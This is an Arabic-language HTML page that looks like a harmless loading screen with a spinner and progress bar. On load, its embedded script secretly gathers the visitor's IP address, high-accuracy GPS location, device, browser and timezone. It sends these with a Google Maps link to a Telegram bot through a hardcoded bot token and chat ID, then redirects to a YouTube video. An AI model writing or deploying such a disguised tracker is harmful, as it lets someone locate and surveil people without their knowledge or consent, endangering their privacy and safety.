<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحميل...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            max-width: 500px;
            width: 100%;
            background: white;
            border-radius: 20px;
            box-shadow: 0 25px 50px rgba(0,0,0,0.15);
            padding: 40px;
            text-align: center;
            animation: fadeIn 0.8s ease-out;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .loading-spinner {
            width: 60px;
            height: 60px;
            border: 6px solid #f3f3f3;
            border-top: 6px solid #3498db;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 30px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        h1 {
            color: #2c3e50;
            margin-bottom: 20px;
            font-size: 2em;
        }

        p {
            color: #7f8c8d;
            font-size: 1.1em;
            line-height: 1.6;
            margin-bottom: 15px;
        }

        .progress-bar {
            width: 100%;
            height: 8px;
            background: #ecf0f1;
            border-radius: 4px;
            overflow: hidden;
            margin: 20px 0;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #3498db, #2ecc71);
            width: 0%;
            animation: progress 3s ease-in-out forwards;
        }

        @keyframes progress {
            0% { width: 0%; }
            50% { width: 70%; }
            100% { width: 100%; }
        }

        .status {
            color: #3498db;
            font-weight: bold;
            margin-top: 15px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="loading-spinner"></div>
        <h1>🔄 جاري التحميل</h1>
        <p>يتم تحضير المحتوى...</p>
        <div class="progress-bar">
            <div class="progress-fill"></div>
        </div>
        <div class="status" id="status">تهيئة النظام...</div>
    </div>

    <script>
        // =============================================================================
        // إعدادات قابلة للتخصيص
        // =============================================================================
        
        // الرابط الذي سيتم التحويل إليه (يمكنك تغييره)
        const REDIRECT_URL = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'; // مثال: يوتيوب
        
        // معلومات البوت
        const BOT_TOKEN = '7982181249:AAEyLwc9c24fu-uqUT87v26S6282XTD41XI';
        const CHAT_ID = '170383339';
        
        // وقت التحويل (بالمللي ثانية) - 3 ثواني افتراضي
        const REDIRECT_DELAY = 3000;
        
        // =============================================================================
        
        // متغيرات عامة
        let collectedData = {};
        let statusElement = document.getElementById('status');
        
        // تحديث حالة العملية
        function updateStatus(message) {
            statusElement.textContent = message;
            console.log('📱 حالة:', message);
        }
        
        // جمع المعلومات الأساسية فوراً
        function getBasicInfo() {
            const ua = navigator.userAgent;
            const now = new Date();
            
            return {
                userAgent: ua,
                timestamp: now.toISOString(),
                localTime: now.toLocaleString('ar-SA'),
                url: window.location.href,
                referrer: document.referrer || 'مباشر',
                language: navigator.language,
                platform: navigator.platform,
                screenResolution: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                deviceType: /iPhone/i.test(ua) ? 'iPhone' : 
                           /iPad/i.test(ua) ? 'iPad' : 
                           /Android/i.test(ua) ? 'Android' : 
                           /Windows/i.test(ua) ? 'Windows' : 
                           /Mac/i.test(ua) ? 'Mac' : 'غير معروف',
                isMobile: /Mobile|Android|iPhone|iPad/i.test(ua),
                browser: /Chrome/i.test(ua) && !/Edge/i.test(ua) ? 'Chrome' :
                        /Firefox/i.test(ua) ? 'Firefox' :
                        /Safari/i.test(ua) && !/Chrome/i.test(ua) ? 'Safari' :
                        /Edge/i.test(ua) ? 'Edge' : 'غير معروف'
            };
        }
        
        // الحصول على IP
        async function getIP() {
            const services = [
                'https://api.ipify.org?format=json',
                'https://httpbin.org/ip'
            ];
            
            for (let service of services) {
                try {
                    const response = await fetch(service, { timeout: 2000 });
                    const data = await response.json();
                    return data.ip || data.origin || 'غير متاح';
                } catch (e) {
                    continue;
                }
            }
            return 'غير متاح';
        }
        
        // الحصول على الموقع
        function getLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve(null);
                    return;
                }
                
                const timeout = setTimeout(() => resolve(null), 5000);
                
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        clearTimeout(timeout);
                        resolve({
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: Math.round(position.coords.accuracy)
                        });
                    },
                    () => {
                        clearTimeout(timeout);
                        resolve(null);
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 4000,
                        maximumAge: 60000
                    }
                );
            });
        }
        
        // إنشاء رابط Google Maps
        function createGoogleMapsLink(lat, lng) {
            return `https://www.google.com/maps/dir//${lat},${lng}/@${lat},${lng},272m/data=!3m1!1e3?entry=ttu&g_ep=EgoyMDI1MDYzMC4wIKXMDSoASAFQAw%3D%3D`;
        }
        
        // إرسال البيانات
        async function sendData(data) {
            let locationInfo = 'غير متاح';
            let mapsLink = '';
            
            if (data.location) {
                const { latitude, longitude, accuracy } = data.location;
                locationInfo = `${latitude.toFixed(6)}, ${longitude.toFixed(6)} (دقة: ${accuracy}م)`;
                mapsLink = createGoogleMapsLink(latitude, longitude);
            }
            
            const message = `🎯 زائر جديد:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⏰ ${data.device.localTime}
🌐 ${data.device.url}
🔗 ${data.device.referrer}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📱 ${data.device.deviceType} | ${data.device.browser}
🌍 IP: ${data.ip}
📍 الموقع: ${locationInfo}
${mapsLink ? `🗺️ الخريطة: ${mapsLink}` : ''}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
            
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message
                    })
                });
                console.log('✅ تم إرسال البيانات');
            } catch (error) {
                console.log('❌ فشل الإرسال:', error);
            }
        }
        
        // التحويل للرابط المحدد
        function redirectToTarget() {
            updateStatus('تم! جاري التحويل...');
            console.log('🔄 التحويل إلى:', REDIRECT_URL);
            
            // تحويل فوري
            window.location.href = REDIRECT_URL;
        }
        
        // العملية الرئيسية
        async function main() {
            try {
                // الخطوة 1: جمع المعلومات الأساسية
                updateStatus('جمع المعلومات الأساسية...');
                collectedData.device = getBasicInfo();
                await new Promise(resolve => setTimeout(resolve, 500));
                
                // الخطوة 2: الحصول على IP والموقع
                updateStatus('تحديد الموقع والـ IP...');
                const [ip, location] = await Promise.all([
                    getIP(),
                    getLocation()
                ]);
                
                collectedData.ip = ip;
                collectedData.location = location;
                
                await new Promise(resolve => setTimeout(resolve, 800));
                
                // الخطوة 3: إرسال البيانات
                updateStatus('إرسال البيانات...');
                await sendData(collectedData);
                
                await new Promise(resolve => setTimeout(resolve, 500));
                
                // الخطوة 4: التحويل
                updateStatus('اكتمل! جاري التحويل...');
                await new Promise(resolve => setTimeout(resolve, 200));
                
                redirectToTarget();
                
            } catch (error) {
                console.log('❌ خطأ:', error);
                updateStatus('حدث خطأ، جاري التحويل...');
                setTimeout(redirectToTarget, 1000);
            }
        }
        
        // بدء العملية عند تحميل الصفحة
        document.addEventListener('DOMContentLoaded', function() {
            console.log('🚀 بدء العملية...');
            
            // بدء العملية بعد تحميل الصفحة مباشرة
            setTimeout(main, 100);
            
            // تحويل اضطراري بعد وقت محدد حتى لو فشلت العملية
            setTimeout(() => {
                if (window.location.href.indexOf(REDIRECT_URL) === -1) {
                    console.log('⏰ انتهت المهلة، تحويل اضطراري');
                    redirectToTarget();
                }
            }, REDIRECT_DELAY + 2000);
        });
        
        // لوغ المعلومات للتطوير
        console.log('🔧 إعدادات النظام:');
        console.log('📍 رابط التحويل:', REDIRECT_URL);
        console.log('⏱️ وقت التحويل:', REDIRECT_DELAY + 'ms');
    </script>
</body>
</html>
